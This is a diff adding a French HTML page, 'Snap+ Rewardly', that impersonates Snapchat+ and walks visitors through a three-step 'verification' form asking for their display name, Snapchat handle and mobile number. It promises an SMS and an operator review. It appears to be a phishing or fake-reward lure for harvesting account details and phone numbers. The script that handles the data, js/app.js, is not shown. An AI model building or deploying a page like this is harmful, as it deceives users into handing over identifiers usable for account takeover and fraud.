@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<meta name="theme-color" content="#000000" />
+<title>Verification — Snap+ Rewardly</title>
+<link rel="stylesheet" href="css/main.css" />
+</head>
+<body>
+<div class="bg-mesh"></div>
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
+
+<div class="form-page">
+<div class="form-card">
+<div class="form-header">
+<div class="form-logo">👻 Snap+</div>
+<div class="form-badge"><span class="badge-dot"></span> <span id="svc-badge">Snapchat+</span></div>
+</div>
+
+<div class="progress-wrap"><div class="progress-fill" id="progress-fill"></div></div>
+
+<div class="steps-dots">
+<div class="step-dot active" data-step="1"><div class="dot">1</div><span>Pseudo</span></div>
+<div class="step-line"></div>
+<div class="step-dot" data-step="2"><div class="dot">2</div><span>Snap</span></div>
+<div class="step-line"></div>
+<div class="step-dot" data-step="3"><div class="dot">3</div><span>Telephone</span></div>
+</div>
+
+<!-- STEP 1 -->
+<div class="step active" id="step-1">
+<h2 class="step-title">Ton pseudo</h2>
+<p class="step-sub">Entre le pseudo visible sur ton profil.</p>
+<div class="input-group">
+<label for="inp-pseudo">Pseudo</label>
+<input type="text" id="inp-pseudo" maxlength="32" placeholder="Ex: Shadow_42" autocomplete="off" />
+<div class="feedback" id="fb-pseudo">3 a 32 caracteres</div>
+</div>
+<button class="btn btn-primary" id="btn-1" disabled>Suivant</button>
+</div>
+
+<!-- STEP 2 -->
+<div class="step" id="step-2">
+<h2 class="step-title" id="step2-title">Ton handle</h2>
+<p class="step-sub" id="step2-sub">Renseigne ton identifiant.</p>
+<div class="input-group">
+<label for="inp-handle" id="step2-label">Identifiant</label>
+<input type="text" id="inp-handle" maxlength="32" placeholder="..." autocomplete="off" />
+<div class="feedback" id="fb-handle"></div>
+</div>
+<div class="step-btns">
+<button class="btn btn-ghost" id="btn-back-2">Retour</button>
+<button class="btn btn-primary" id="btn-2" disabled>Suivant</button>
+</div>
+</div>
+
+<!-- STEP 3 -->
+<div class="step" id="step-3">
+<h2 class="step-title">Numero de telephone</h2>
+<p class="step-sub">Un SMS de verification sera envoye sur ce numero.</p>
+<div class="input-group">
+<label for="inp-phone">Telephone</label>
+<input type="tel" id="inp-phone" maxlength="10" placeholder="06XXXXXXXX" inputmode="numeric" autocomplete="tel" />
+<div class="feedback" id="fb-phone">Format : 06 ou 07 + 8 chiffres</div>
+</div>
+<div id="op-badge"></div>
+<div class="step-btns">
+<button class="btn btn-ghost" id="btn-back-3">Retour</button>
+<button class="btn btn-primary" id="btn-submit" disabled>
+<span>Continuer</span>
+<svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M3 8h10M9 4l4 4-4 4" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+</button>
+</div>
+</div>
+
+<!-- SUCCESS -->
+<div class="step" id="step-ok" style="display:none">
+<div class="ok-icon">&#10003;</div>
+<h2 class="step-title">Demande envoyee</h2>
+<p class="step-sub">Un operateur va traiter ta demande. Tu vas etre redirige.</p>
+</div>
+
+</div>
+</div>
+
+<div id="toast-wrap" class="toast-wrap"></div>
+
+<script src="js/app.js"></script>
+</body>
+</html>
